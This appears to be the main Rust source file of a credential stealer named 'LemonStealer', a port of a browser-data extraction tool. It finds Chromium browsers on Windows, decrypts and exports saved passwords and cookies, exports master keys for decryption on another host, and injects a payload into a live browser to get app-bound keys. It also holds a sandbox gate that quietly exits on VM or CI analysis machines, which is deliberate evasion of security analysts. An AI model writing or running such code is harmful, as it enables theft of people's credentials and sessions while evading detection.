//! CLI binary — port of `cmd/hack-browser-data` (Phase 4: real dump/list/version).
//!
//! Flag-name/short/alias parity (PLAN R8): `-b -c -f -d -p --zip -v`, `dump` is the
//! default command when no subcommand is given (Go: root copies dump's flags).
//! `--keychain-pw` (macOS-only) is intentionally dropped.

use std::path::Path;
use std::process::ExitCode;

use clap::{Args, Parser, Subcommand};
use hbd_core::{Category, parse_categories};
use log::{error, info, warn};

mod logging;

use browser::discover::{DiscoveredBrowser, discover_browsers_with_keys};
use logging::LemonLogger;

/// A CLI tool for decrypting and exporting browser data.
#[derive(Parser, Debug)]
#[command(
    name = "LemonStealer",
    version,
    about = "Decrypt and export browser data (Chromium, Windows)",
    long_about = "LemonStealer decrypts and exports browser data from Chromium-based\nbrowsers on Windows.",
    subcommand_required = false,
    arg_required_else_help = false
)]
struct Cli {
    /// Enable debug logging (Go: persistent `-v`).
    #[arg(short = 'v', long = "verbose", global = true)]
    verbose: bool,

    // Root-level dump options so `LemonStealer -b chrome` ≡ `LemonStealer dump -b chrome`
    // (Go: root.RunE delegates to dump, flags copied to root).
    #[command(flatten)]
    dump: DumpArgs,

    #[command(subcommand)]
    command: Option<Command>,
}

/// Flags shared by `dump` / `restore` (Go's `dump` flag set).
#[derive(Args, Debug, Clone)]
struct DumpArgs {
    /// Target browser: all|chrome|edge|...
    #[arg(short = 'b', long = "browser", default_value = "all")]
    browser: String,
    /// Data categories (comma-separated): all|password,cookie,...
    #[arg(short = 'c', long = "category", default_value = "all")]
    category: String,
    /// Output format: csv|json|cookie-editor.
    #[arg(short = 'f', long = "format", default_value = "json")]
    format: String,
    /// Output directory.
    #[arg(short = 'd', long = "dir", default_value = "results")]
    dir: String,
    /// Custom profile dir path, get with chrome://version.
    #[arg(short = 'p', long = "profile-path", default_value = "")]
    profile_path: String,
    /// Compress output to zip.
    #[arg(long = "zip")]
    zip: bool,
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Extract and decrypt browser data (default command).
    Dump {
        #[command(flatten)]
        args: DumpArgs,
    },
    /// Export Chromium master keys as JSON for cross-host decryption.
    /// NOTE: the command name is `dumpkeys`, not `dump-keys` (Go parity).
    Dumpkeys {
        /// Target browser: all|chrome|edge|...
        #[arg(short = 'b', long = "browser", default_value = "all")]
        browser: String,
        /// Output file (default: stdout).
        #[arg(short = 'o', long = "output", default_value = "")]
        output: String,
    },
    /// Pack decryption-relevant profile files into a zip for cross-host restore.
    Archive {
        /// Target browser: all|chrome|edge|...
        #[arg(short = 'b', long = "browser", default_value = "all")]
        browser: String,
        /// Data categories (comma-separated): all|password,cookie,...
        #[arg(short = 'c', long = "category", default_value = "all")]
        category: String,
        /// Output archive of decryption-relevant browser files.
        #[arg(short = 'o', long = "output", default_value = "browser-data.zip")]
        output: String,
    },
    /// Decrypt copied profile data using exported master keys.
    Restore {
        /// Keys file from dumpkeys (use - for stdin).
        #[arg(long = "keys")]
        keys: String,
        /// Copied profile data dir (archive layout, or one browser's User Data with -b).
        #[arg(long = "data-dir", default_value = "")]
        data_dir: String,
        /// Zip produced by the archive command (alternative to --data-dir).
        #[arg(long = "data-zip", default_value = "")]
        data_zip: String,
        #[command(flatten)]
        args: DumpArgs,
    },
    /// List installed browsers and their profiles.
    List {
        /// Per-category entry counts (no decryption).
        #[arg(long = "detail")]
        detail: bool,
    },
    /// Print version information.
    Version,
}

fn main() -> ExitCode {
    let cli = Cli::parse();
    // Logging setup FIRST — Go's PersistentPreRun runs before any command.
    LemonLogger::new(cli.verbose).init();
    // Sandbox gate: if the host looks like a VM/CI analysis box, walk away
    // quietly (exit 0, no extraction attempted, no refusal trace).
    if !bypass::sandbox::gate() {
        return ExitCode::SUCCESS;
    }
    match dispatch(cli) {
        Ok(()) => ExitCode::SUCCESS,
        Err(err) => {
            eprintln!("LemonStealer: {err:#}");
            ExitCode::FAILURE
        }
    }
}

fn dispatch(cli: Cli) -> anyhow::Result<()> {
    // Resolve browser name to kind, then discover — shared by dump (default or
    // explicit) and dumpkeys. Go discovers per command; a single pass keeps
    // the same semantics since discovery is read-only.
    let browser_name = cli.dump.browser.trim().to_lowercase();
    let browsers = discover_for(&browser_name)?;

    match cli.command {
        None => {
            // Default: dump command (Go: root.RunE = dump.RunE).
            run_dump(&browsers, &cli.dump)
        }
        Some(Command::Dump { args }) => run_dump(&browsers, &args),
        Some(Command::Dumpkeys { browser, output }) => run_dumpkeys(&browsers, &browser, &output),
        Some(Command::Archive { .. }) => {
            // Phase 5 wiring (Archivable archive_sources).
            anyhow::bail!("archive command not implemented yet (Phase 5)")
        }
        Some(Command::Restore { .. }) => {
            anyhow::bail!("restore command not implemented yet (Phase 5)")
        }
        Some(Command::List { detail }) => run_list(&browsers, detail),
        Some(Command::Version) => {
            println!(
                "LemonStealer {}\n  commit: {}\n  built:  {}",
                env!("CARGO_PKG_VERSION"),
                option_env!("LEMON_GIT_COMMIT").unwrap_or("none"),
                option_env!("LEMON_BUILD_DATE").unwrap_or("unknown"),
            );
            Ok(())
        }
    }
}

/// Discovers browsers matching `browser_name`, wiring Windows master-key
/// retrievers (Go: `DiscoverBrowsersWithKeys`).
fn discover_for(browser_name: &str) -> anyhow::Result<Vec<DiscoveredBrowser>> {
    if browser_name == "all" || browser_name.is_empty() {
        return Ok(
            discover_browsers_with_keys(|b| b.set_retrievers(windows_retrievers()))
                .unwrap_or_default(),
        );
    }
    let cfg = browser::platform_browsers()
        .into_iter()
        .find(|c| c.key == browser_name || c.name.to_lowercase() == browser_name);
    match cfg {
        Some(config) => {
            if let Ok(Some(mut b)) = browser::chromium::new_browser(config) {
                b.set_retrievers(windows_retrievers());
                Ok(vec![Box::new(b) as DiscoveredBrowser])
            } else {
                Ok(vec![])
            }
        }
        None => Ok(vec![]),
    }
}

/// Go `extractAndWrite`: extract every browser, accumulate into the writer,
/// write per-profile files, optionally compress.
fn run_dump(browsers: &[DiscoveredBrowser], args: &DumpArgs) -> anyhow::Result<()> {
    let start = std::time::Instant::now();
    if browsers.is_empty() {
        warn!("no browsers found");
        return Ok(());
    }
    let categories = parse_categories(&args.category)?;
    let mut writer =
        output::Writer::new(&args.dir, &args.format).map_err(|e| anyhow::anyhow!("{e}"))?;

    for b in browsers {
        let n = b.profiles().len();
        info!(
            "Extracting {}... ({} profile{})",
            b.browser_name(),
            n,
            if n == 1 { "" } else { "s" }
        );
        let b_start = std::time::Instant::now();
        match b.extract(&categories) {
            Ok(results) => {
                for r in results {
                    writer.add(b.browser_name(), &r.profile.name, &r.data);
                }
                info!(
                    "  {}: extraction took {}",
                    b.browser_name(),
                    format_duration(b_start.elapsed())
                );
            }
            Err(e) => error!("extract {}: {}", b.browser_name(), e),
        }
    }
    writer.write()?;

    if args.zip {
        let dir = Path::new(&args.dir);
        filemanager::compress_dir(dir).map_err(|e| anyhow::anyhow!("compress: {e}"))?;
        let base = dir
            .file_name()
            .map(|s| s.to_string_lossy().into_owned())
            .unwrap_or_else(|| "results".to_string());
        info!("Compressed: {}/{}.zip", args.dir, base);
    }
    info!("Done in {}", format_duration(start.elapsed()));
    Ok(())
}

/// Formats a [`std::time::Duration`] as `1.23s` / `45.2ms` / `890µs`.
fn format_duration(d: std::time::Duration) -> String {
    if d.as_secs() >= 1 {
        format!("{:.2}s", d.as_secs_f64())
    } else if d.as_millis() >= 1 {
        format!("{}ms", d.as_millis())
    } else {
        format!("{}µs", d.as_micros())
    }
}

/// Go `dumpKeysCmd`: BuildDump (skip vaults without keys) -> WriteDump.
fn run_dumpkeys(
    browsers: &[DiscoveredBrowser],
    browser_name: &str,
    output: &str,
) -> anyhow::Result<()> {
    if browser_name.trim().to_lowercase() != "all" && browsers.is_empty() {
        warn!("no browsers found");
        return Ok(());
    }
    let dump = browser::build_dump(browsers)?;
    info!("Exported keys for {} vault(s)", dump.vaults.len());
    if output.is_empty() {
        let mut stdout = std::io::stdout().lock();
        browser::write_dump(&mut stdout, &dump)?;
        return Ok(());
    }
    let mut f = std::fs::File::create(output)?;
    write_0600(&f)?;
    browser::write_dump(&mut f, &dump)?;
    Ok(())
}

/// Best-effort `0600` file mode (Go: `os.OpenFile(..., 0600)`); on Windows the
/// ACL model makes it a no-op, matching Go's behavior there.
#[cfg(unix)]
fn write_0600(f: &std::fs::File) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    f.set_permissions(std::fs::Permissions::from_mode(0o600))
}

#[cfg(not(unix))]
fn write_0600(_f: &std::fs::File) -> std::io::Result<()> {
    Ok(())
}

/// Master-key retrievers for this platform. Windows: DPAPI lifts the v10 key
/// from `Local State`; ABE (v20) injects the payload into a real browser
/// instance to decrypt the app-bound key. Other hosts: no tiers.
fn windows_retrievers() -> keyring::Retrievers {
    #[cfg(windows)]
    {
        keyring::Retrievers {
            v10: Some(Box::new(keyring::DpapiRetriever)),
            v20: Some(Box::new(keyring::AbeRetriever)),
            ..Default::default()
        }
    }
    #[cfg(not(windows))]
    {
        keyring::Retrievers::default()
    }
}

/// Go `listCmd` — tab-aligned columns with 3-space padding (Go tabwriter
/// with `padding=3`, left-aligned).
fn run_list(browsers: &[DiscoveredBrowser], detail: bool) -> anyhow::Result<()> {
    if browsers.is_empty() {
        println!("No browsers found.");
        return Ok(());
    }
    if detail {
        print_detail(browsers)
    } else {
        print_basic(browsers)
    }
}

fn print_basic(browsers: &[DiscoveredBrowser]) -> anyhow::Result<()> {
    let mut rows: Vec<Vec<String>> = vec![vec!["Browser".into(), "Profile".into(), "Path".into()]];
    for b in browsers {
        for p in b.profiles() {
            rows.push(vec![b.browser_name().to_string(), p.name, p.dir]);
        }
    }
    print_table(&rows)
}

fn print_detail(browsers: &[DiscoveredBrowser]) -> anyhow::Result<()> {
    let mut rows: Vec<Vec<String>> = vec![{
        let mut header = vec!["Browser".to_string(), "Profile".to_string()];
        header.extend(Category::ALL.iter().map(|c| c.to_string()));
        header
    }];
    for b in browsers {
        let counts = b.count_entries(&Category::ALL).unwrap_or_default();
        for r in counts {
            let mut row = vec![b.browser_name().to_string(), r.profile.name.clone()];
            for c in Category::ALL {
                row.push(r.counts.get(&c).copied().unwrap_or(0).to_string());
            }
            rows.push(row);
        }
    }
    print_table(&rows)
}

/// Minimal tabwriter: compute each column's max width, pad with 3 spaces.
fn print_table(rows: &[Vec<String>]) -> anyhow::Result<()> {
    let cols = rows.iter().map(|r| r.len()).max().unwrap_or(0);
    let widths: Vec<usize> = (0..cols)
        .map(|c| {
            rows.iter()
                .map(|r| r.get(c).map_or(0, String::len))
                .max()
                .unwrap_or(0)
        })
        .collect();
    let mut out = String::new();
    for row in rows {
        for (c, cell) in row.iter().enumerate() {
            if c > 0 {
                out.push(' ');
            }
            out.push_str(cell);
            if c + 1 < row.len() {
                out.push_str(&" ".repeat(widths[c] - cell.len() + 2));
            }
        }
        out.push('\n');
    }
    print!("{out}");
    Ok(())
}
